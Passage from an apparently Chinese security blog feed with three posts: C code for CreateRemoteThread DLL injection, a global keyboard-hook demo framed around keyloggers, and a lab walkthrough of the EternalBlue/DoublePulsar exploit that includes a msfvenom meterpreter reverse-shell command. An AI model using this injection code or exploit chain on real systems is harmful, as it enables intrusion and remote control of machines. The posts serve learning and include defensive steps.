<h2 id="2-注入程序"><a href="#2-注入程序" class="headerlink" title="2. 注入程序"></a>2. 注入程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Injectmain.cpp</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</div><div class="line">	HMODULE hMod = <span class="literal">NULL</span>;</div><div class="line">	LPVOID pRemoteBuf = <span class="literal">NULL</span>;</div><div class="line">	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">	LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line">	<span class="comment">// Open target process to inject dll</span></div><div class="line">	<span class="keyword">if</span>( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Fail to open process %d ! [%d]\n"</span>, dwPID, GetLastError());</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Allocate memory in the remote process big enough for the DLL path name</span></div><div class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">	<span class="comment">// Write the DLL path name to the space allocated in the target process</span></div><div class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Find the address of LoadLibrary in target process(same to this process)</span></div><div class="line">	hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Create a remote thread in target process</span></div><div class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">	WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">	CloseHandle(hThread);</div><div class="line">	VirtualFreeEx(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</div><div class="line">	CloseHandle(hProcess);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">3</span> )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Usage: %s &lt;pid&gt; &lt;dll_path&gt; \n"</span>, argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Inject DLL</span></div><div class="line">	<span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</div><div class="line">		_tprintf(<span class="string">L"InjectDll &lt;%s&gt;sucess! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line">	<span class="keyword">else</span></div><div class="line">		_tprintf(<span class="string">L"InjectDLL &lt;%s&gt; fail! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3-测试效果"><a href="#3-测试效果" class="headerlink" title="3. 测试效果"></a>3. 测试效果</h2><p>运行 Injectmain.exe 将 DLL 注入到进程 3656（notepad.exe）中，注入成功将弹出消息框。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-5-11/94028700-file_1494473311845_13a5b.png" alt=""><br>查看 notepad.exe 进程加载的模块列表，可以看到 InjectDll.dll 已被加载。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-5-11/35149412-file_1494473313402_167fd.png" alt="">    </p>
<hr>
<p>References:<br>[1] 逆向工程核心原理<br>[2] <a href="https://etenal.me/archives/871" target="_blank" rel="external">DLL注入浅析（下）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之 Windows 消息钩子]]></title>
      <url>/2017/0508/dll-injection-windows-message-hook/</url>
      <content type="html"><![CDATA[<p>Windows 下的窗口应用程序是基于事件驱动方式工作的，操作系统中点击鼠标和按下键盘都是一种事件，当事件发生时操作系统会将消息发送给相应的应用程序，应用程序收到消息之后会做出响应。</p>
<blockquote>
<p>钩子(Hook)，是Windows提供的一种截获和监视系统中消息的方法，应用程序可以通过 SetWindowsHook 函数设置钩子以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。</p>
</blockquote>
<h1 id="0x01-钩子原理"><a href="#0x01-钩子原理" class="headerlink" title="0x01 钩子原理"></a>0x01 钩子原理</h1><p>操作系统维护着一个链表进行钩子的管理，每设置一个钩子就在钩链中增加一个节点，最新设定的钩子将会最早获得消息的控制权。此外，每个钩子需要设定一个回调函数（钩子函数），在产生指定消息后作出处理。当指定消息发生时，系统会调用这些回调函数。在回调函数中可以监视消息、修改消息，或者屏蔽消息，使消息无法传递到目的窗口。</p>
<p>根据钩子的范围可分为全局钩子和局部钩子，全局钩子可以钩取所有基于消息机制的应用程序，局部钩子只是钩取指定线程的消息。全局钩子将钩子函数放在一个 DLL 中，当某个进程产生指定消息之后，操作系统会自动将该 DLL 注入到该进程中。</p>
<p>常用钩子类型有以下几种：<br>（1）键盘钩子和低级键盘钩子可以监视各种键盘消息。<br>（2）鼠标钩子和低级鼠标钩子可以监视各种鼠标消息。<br>（3）外壳钩子可以监视各种Shell事件消息。比如启动和关闭应用程序。<br>（4）日志钩子可以记录从系统消息队列中取出的各种事件消息。<br>（5）窗口过程钩子监视所有从系统消息队列发往目标窗口的消息。   </p>
<p>Windows 提供消息钩子相关的 API 主要有 SetWindowsHookEx()、CallNextHookEx() 和 UnhookWindowsHookEx()。</p>
<h1 id="0x02-键盘钩子"><a href="#0x02-键盘钩子" class="headerlink" title="0x02 键盘钩子"></a>0x02 键盘钩子</h1><p>键盘记录器是恶意代码中常见的一种类型，木马编写者通常以隐蔽的方式将键盘记录器安装在目标主机以窃取登录凭证等敏感信息。通过消息钩子可以实现一个键盘记录器，但是这种方法极容易被杀毒软件发现。下面通过一个简单的例子演示全局键盘钩子。</p>
<h2 id="1-安装与卸载钩子"><a href="#1-安装与卸载钩子" class="headerlink" title="1. 安装与卸载钩子"></a>1. 安装与卸载钩子</h2><p>由于是全局消息钩子，所以需要将消息钩子的安装与卸载放在 DLL 中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus    <span class="comment">// If used by C++ code,</span></span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;          <span class="comment">// export the C interface</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hModule, <span class="number">0</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (g_hHook)</div><div class="line">	&#123;</div><div class="line">		UnhookWindowsHookEx(g_hHook);</div><div class="line">		g_hHook = <span class="literal">NULL</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>SetWindowsHookEx 用于安装消息钩子，该函数第二个参数为钩取消息后系统调用的回调函数，函数的返回值为钩子句柄。函数原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookExW</span><span class="params">(</span></span></div><div class="line">    _In_ <span class="keyword">int</span> idHook, 					<span class="comment">// type of hook, WH_KEYBOARD is Keyboard hook</span></div><div class="line">    _In_ HOOKPROC lpfn,       <span class="comment">// hook procedure</span></div><div class="line">    _In_opt_ HINSTANCE hmod,  <span class="comment">// handle of hook's DLL</span></div><div class="line">    _In_ DWORD dwThreadId     <span class="comment">// thread ID，0 means global hook</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>UnhookWindowsHookEx 用于卸载消息钩子，它只有一个参数，即需要卸载消息钩子的句柄。</p>
<p>在 DLL 中要将该函数导出供主程序使用，<code>_declspec(dllexport)</code>声明 InstallHook() 和 UninstallHook() 为导出函数。</p>
<h2 id="2-钩子函数"><a href="#2-钩子函数" class="headerlink" title="2. 钩子函数"></a>2. 钩子函数</h2><p>全局键盘消息钩子会截获所有应用程序的键盘消息，包括系统的控制台程序，为了方便操作，若目标程序为控制台程序（conhost.exe）则直接将消息传递给它；否则当有键盘按下都会弹出消息窗口，并显示按下的按键。具体实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(nCode &gt;= <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// bit 31 : transition state. 0 =&gt; press, 1 =&gt; release</span></div><div class="line">		<span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">char</span> tcKey[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> tcPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> *name = <span class="literal">NULL</span>;</div><div class="line">			GetKeyNameTextA(lParam, tcKey, <span class="number">50</span>);  <span class="comment">// Retrieves a string that represents the name of a key</span></div><div class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, tcPath, MAX_PATH);</div><div class="line">			name = <span class="built_in">strrchr</span>(tcPath,<span class="string">'\\'</span>) + <span class="number">1</span> ;</div><div class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,<span class="string">"conhost.exe"</span>))  <span class="comment">// Console Host Process</span></div><div class="line">				<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">			<span class="keyword">else</span></div><div class="line">				MessageBoxA(<span class="literal">NULL</span>, tcKey, name, MB_OK);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">	 <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>GetKeyNameTextA 用于获取按键名字符串。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">GetKeyNameText</span><span class="params">(</span></span></div><div class="line">  _In_  LONG   lParam,  </div><div class="line">  _Out_ LPTSTR lpString,  <span class="comment">// buffer to receive the key name</span></div><div class="line">  _In_  <span class="keyword">int</span>    cchSize    <span class="comment">// The maximum of the key name</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>CallNextHookEx 将消息继续传递给钩子链中下一个钩子函数，直到目标窗口。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT WINAPI <span class="title">CallNextHookEx</span><span class="params">(</span></span></div><div class="line">  _In_opt_ HHOOK  hhk,    <span class="comment">// handle of hook</span></div><div class="line">  _In_     <span class="keyword">int</span>    nCode,</div><div class="line">  _In_     WPARAM wParam,</div><div class="line">  _In_     LPARAM lParam</div><div class="line">);</div></pre></td></tr></table></figure></p>
<h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>以上即为消息钩子相关的函数，下面调用这些函数测试键盘钩子的效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funptr)</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	HMODULE hDll = <span class="literal">NULL</span>;</div><div class="line">	funptr InstallHook = <span class="literal">NULL</span>;</div><div class="line">	funptr UninstallHook = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> cmd[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------Command-----------------------\n\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] install : Install hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] uninstall : Uninstall hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n\n"</span>);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		gets(cmd);</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd ,<span class="string">"install"</span>))</div><div class="line">		&#123;</div><div class="line">			hDll = LoadLibraryA(<span class="string">"keyhook.dll"</span>);</div><div class="line">			<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			&#123;</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"LoadLibrary Fail!\n"</span>);</div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;</div><div class="line">			InstallHook = (funptr)GetProcAddress(hDll, <span class="string">"InstallHook"</span>);</div><div class="line">			UninstallHook = (funptr)GetProcAddress(hDll, <span class="string">"UninstallHook"</span>);</div><div class="line">			InstallHook();</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Keyboard hook installed!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd, <span class="string">"uninstall"</span>))</div><div class="line">		&#123;</div><div class="line">			UninstallHook();</div><div class="line">			FreeLibrary(hDll);</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Sucess to uninstall hook!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在记事本中按下按键，弹出按键值。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-5-8/7397613-file_1494250200322_1341b.png" alt="">  </p>
<p>查看记事本进程模块，可以看到 DLL 已成功注入该进程。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-5-8/20626831-file_1494250203063_f29f.png" alt=""></p>
<h1 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h1><p>使用 OllyDbg 可以调试注入到目标进程中的 DLL 文件，具体步骤如下：</p>
<blockquote>
<p>1.运行 notepad.exe，使用 OD attach 运行中的 notepad；<br>2.选项/ 调试选项/ 事件/ 中断于新模块（dll）；<br>3.运行 Hook.exe，安装全局消息钩子；<br>4.在 notepad 中使用键盘输入，keyhook.dll 被注入到 notepad 中；<br>5.OD 暂停调试，并弹出 Executable modules 窗口；<br>6.取消之前设置的 “ 中断于新模块（dll）” ，双击 keyhook.dll 即可到达其 EP 地址处。</p>
</blockquote>
<hr>
<p>References:<br>[1] 逆向工程核心原理<br>[2] <a href="https://lellansin.wordpress.com/2013/08/15/windows-api-%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89-hook-%E9%92%A9%E5%AD%90%E7%9B%91%E5%90%AC%EF%BC%88%E7%BC%96%E5%86%99%E4%B8%AD%EF%BC%89/" target="_blank" rel="external"> Windows API 教程（七）hook 钩子监听</a><br>[3] <a href="https://etenal.me/archives/844" target="_blank" rel="external">DLL注入浅析（上）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hook </tag>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[复现 NSA Enternalblue SMB 漏洞]]></title>
      <url>/2017/0427/reproduce-nsa-enternalblue-smb-vulnerability/</url>
      <content type="html"><![CDATA[<p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
<h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
<h1 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h1><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
<h2 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h2><table>
<thead>
<tr>
<th style="text-align:left">PC</th>
<th style="text-align:left">IP</th>
<th>用途</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Win 7 x64</td>
<td style="text-align:left">192.168.109.1</td>
<td>攻击机</td>
<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
</tr>
<tr>
<td style="text-align:left">Win 7 x86</td>
<td style="text-align:left">192.168.109.132</td>
<td>靶机</td>
<td>开启 SMB 服务（445端口）</td>
</tr>
<tr>
<td style="text-align:left">Kali Linux</td>
<td style="text-align:left">192.168.109.128</td>
<td>控制端</td>
<td>生成payload 并控制回连会话</td>
</tr>
</tbody>
</table>
<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
<h2 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a>2. 测试流程</h2><h3 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a>1）运行 fuzzbunch 框架</h3><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/95094523-file_1493344655277_8614.png" alt="">      </p>
<h3 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a>2）调用 Eternalblue 攻击系统</h3><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/73280707-file_1493345362094_157db.png" alt="">    </p>
<h3 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a>3）Metasploit 生成恶意 DLL</h3><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
<h3 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a>4）开启 msf 监听</h3><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/80220500-file_1493346556508_101d9.png" alt="">    </p>
<h3 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a>5）调用 Doublepulsar 注入 DLL</h3><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
<h3 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a>6）建立连接</h3><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
<h1 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a>0x03 防御措施</h1><ol>
<li>尽快升级系统补丁     </li>
<li>开启防火墙，并限制 445 端口<br>通过以下命令添加防火墙规则：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block</div></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<p>References:<br>[1] <a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">NSA工具包之0day Eternalblue 复现笔记</a><br>[2] <a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008</a><br>[3] <a href="https://www.vulbox.com/knowledge/detail/?id=6" target="_blank" rel="external">NSA Fuzzbunch分析与利用案例</a></p>
]]></content>
      
        <categories>
            
            <category> Vulnerability Analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Enternalblue </tag>
            
            <tag> Doublepulsar </tag>
            
            <tag> SMB </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 Github 和 Hexo 搭建个人博客]]></title>
      <url>/2017/0426/build-a-personal-blog-with-github-and-hexo/</url>
      <content type="html"><![CDATA[<p>平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。</p>
<h1 id="0x01-安装Node-js"><a href="#0x01-安装Node-js" class="headerlink" title="0x01 安装Node.js"></a>0x01 安装Node.js</h1><h2 id="1-通过nvm安装Node-js"><a href="#1-通过nvm安装Node-js" class="headerlink" title="1. 通过nvm安装Node.js"></a>1. 通过nvm安装Node.js</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh</div><div class="line">$ nvm ls-remote</div><div class="line">$ nvm install v7.9.0</div></pre></td></tr></table></figure>
